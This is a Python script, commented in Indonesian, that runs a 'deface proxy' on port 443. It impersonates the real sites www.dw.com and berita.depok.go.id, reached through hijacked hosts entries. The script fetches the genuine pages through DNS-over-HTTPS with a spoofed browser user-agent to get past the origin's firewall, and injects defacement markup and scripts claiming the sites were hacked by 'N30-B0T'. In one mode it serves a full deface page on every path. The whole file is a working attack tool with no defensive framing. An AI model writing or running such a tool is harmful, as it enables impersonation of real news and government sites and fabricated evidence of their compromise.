#!/usr/bin/env python3
"""
DEFACE PROXY v2 — www.dw.com (lama) + berita.depok.go.id (baru) lewat sini.
Setiap halaman HTML dicegat, disuntik payload deface, lalu disajikan.
Aset/JSON non-HTML diteruskan ke server asli (resolusi via DoH, karena hosts lokal sudah dibajak).
Routing per-Host: tiap domain punya payload & title sendiri.
"""
import http.client, json, pathlib, re, socket, ssl, sys, time, urllib.parse, urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

BASE = pathlib.Path(__file__).parent

def load(d):
    d = pathlib.Path(d)
    return {
        'css':  (d / 'payload.css').read_text(encoding='utf-8'),
        'html': (d / 'payload.html').read_text(encoding='utf-8'),
        'js':   (d / 'payload.js').read_text(encoding='utf-8'),
    }

HOSTS = {
    'berita.depok.go.id': {
        'pl': load(BASE),
        'title': '<title>\u26a0 BERITA DEPOK DIBOBOL N30-B0T \u26a0</title>',
        'extra': '<style>body>*:not(#df-bg):not(.df-stamp):not(.df-wrap):not(.df-marquee){display:none!important}</style>',
        'rewrite': ['https://berita.depok.go.id/', 'http://berita.depok.go.id/'],
        'raw': (BASE / 'defaced.html').read_bytes(),  # Zone-H: semua path dilayani halaman deface
    },
    'depok.go.id': None,  # alias, diisi di bawah
    'www.dw.com': {
        'pl': load(BASE.parent / 'deface-dw'),
        'title': '<title>\u26a0 DW DIBOBOL N30-B0T \u26a0</title>',
        'extra': '<style>#root,#navigation{display:none!important}</style>',
    },
    'dw.com': None,  # alias
}
HOSTS['depok.go.id'] = HOSTS['berita.depok.go.id']
HOSTS['dw.com'] = HOSTS['www.dw.com']

CACHE = {}  # host -> (ip, ts)

def real_ip(host):
    now = time.time()
    ip, ts = CACHE.get(host, (None, 0))
    if ip and now - ts < 60:
        return ip
    for qtype in ('A', 'AAAA'):
        try:
            req = urllib.request.Request(
                f'https://cloudflare-dns.com/dns-query?name={host}&type={qtype}',
                headers={'accept': 'application/dns-json'})
            j = json.load(urllib.request.urlopen(req, timeout=8))
            for a in j.get('Answer', []):
                if a['type'] in (1, 28):
                    ip = a['data']
                    break
        except Exception:
            pass
        if ip:
            break
    CACHE[host] = (ip, now)
    return ip

# pembajakan balik: kode di proses ini tetap dapat IP asli, bukan 127.0.0.1 dari /etc/hosts
_ORIG_GAI = socket.getaddrinfo
def _gai(host, *a, **k):
    if host in HOSTS:
        ip = real_ip(host)
        if ip:
            host = ip
    return _ORIG_GAI(host, *a, **k)
socket.getaddrinfo = _gai

def fetch(host, path, ua):
    # WAF server asli suka nolak UA headless/curl -> pakai UA browser beneran
    ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36'
    ctx = ssl.create_default_context()  # sertifikat asli diverifikasi terhadap hostname asli
    for _ in range(6):  # ikuti redirect server asli sampai halaman final
        conn = http.client.HTTPSConnection(host, 443, context=ctx, timeout=15)
        conn.request('GET', path, headers={
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,*/*',
            'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
            'Accept-Encoding': 'identity', 'Connection': 'close'})
        r = conn.getresponse()
        body = r.read()
        status = r.status
        ct = r.getheader('content-type', 'application/octet-stream')
        loc = r.getheader('location')
        conn.close()
        if status in (301, 302, 303, 307, 308) and loc:
            path = urllib.parse.urlsplit(loc)
            path = urllib.parse.urlunsplit(('', '', path.path or '/', path.query, ''))
            continue
        return status, ct, body
    return status, ct, body

def deface(html, cfg):
    html = re.sub(r'<title[^>]*>.*?</title>', '', html, flags=re.S)
    inject_head = cfg['title'] + cfg['extra'] + '<style>' + cfg['pl']['css'] + '</style>'
    inject_body = cfg['pl']['html'] + '<script>' + cfg['pl']['js'] + '</script>'
    if re.search(r'</head>', html, re.I):
        html = re.sub(r'</head>', lambda m: inject_head + '</head>', html, count=1, flags=re.I)
    else:
        html = inject_head + html
    if re.search(r'</body>', html, re.I):
        html = re.sub(r'</body>', lambda m: inject_body + '</body>', html, count=1, flags=re.I)
    else:
        html = html + inject_body
    for u in cfg.get('rewrite', []):  # link absolut -> relatif biar tetap di sarang deface
        html = html.replace(u, '/')
    return html.encode('utf-8')

class H(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'

    def send(self, status, ct, body, extra=None):
        self.send_response(status)
        self.send_header('Content-Type', ct)
        self.send_header('Content-Length', str(len(body)))
        self.send_header('X-Defaced-By', 'n30-b0t')
        self.send_header('Connection', 'close')
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        if self.command == 'GET':
            self.wfile.write(body)

    def do_GET(self):  self.process()
    def do_HEAD(self): self.process()

    ASSET_RE = re.compile(r'\.(?:css|js|mjs|png|jpe?g|webp|gif|svg|ico|json|xml|txt|map|woff2?|ttf|mp4|webm|webmanifest)(?:\?|$)', re.I)

    def process(self):
        host = (self.headers.get('Host') or '').split(':')[0].lower()
        cfg = HOSTS.get(host)
        if not cfg:
            # host asing (mis. tunnel) -> anggap portal berita depok
            host = 'berita.depok.go.id'
            cfg = HOSTS[host]
        if cfg.get('raw'):
            # mode Zone-H: halaman deface penuh untuk SEMUA path navigasi, aset diteruskan
            if self.ASSET_RE.search(self.path):
                try:
                    status, ct, body = fetch(host, self.path, self.headers.get('User-Agent', 'curl'))
                    self.send(status, ct, body)
                    sys.stderr.write(f'[passthru] {host}{self.path}\n')
                except Exception as e:
                    self.send(404, 'text/plain', b'asset hilang, wajar')
                return
            self.send(200, 'text/html; charset=utf-8', cfg['raw'])
            sys.stderr.write(f'[DEFACE-ZONEH] {host}{self.path}\n')
            return
        try:
            status, ct, body = fetch(host, self.path, self.headers.get('User-Agent', 'curl'))
            if 'text/html' in ct:
                self.send(200, ct, deface(body.decode('utf-8', 'replace'), cfg))
                sys.stderr.write(f'[DEFACE] {host}{self.path}\n')
            else:
                self.send(status, ct, body)
                sys.stderr.write(f'[passthru] {host}{self.path} ({ct.split(";")[0]})\n')
        except Exception as e:
            msg = f'<h1 style="font-family:monospace;color:#39ff14;background:#000;padding:40px">proxy deface error: {e}</h1>'.encode()
            self.send(502, 'text/html', msg)
            sys.stderr.write(f'[ERR] {host}{self.path}: {e}\n')

    def log_message(self, *a): pass

if __name__ == '__main__':
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(str(BASE / 'cert.pem'), str(BASE / 'key.pem'))

    class HTTPSrv(ThreadingHTTPServer):
        def get_request(self):
            conn, addr = self.socket.accept()
            conn = ctx.wrap_socket(conn, server_side=True)
            return conn, addr

    srv = HTTPSrv(('0.0.0.0', 443), H)
    sys.stderr.write('deface proxy v2 siap di 443 (TLS: dw.com + berita.depok.go.id)\n')
    srv.serve_forever()
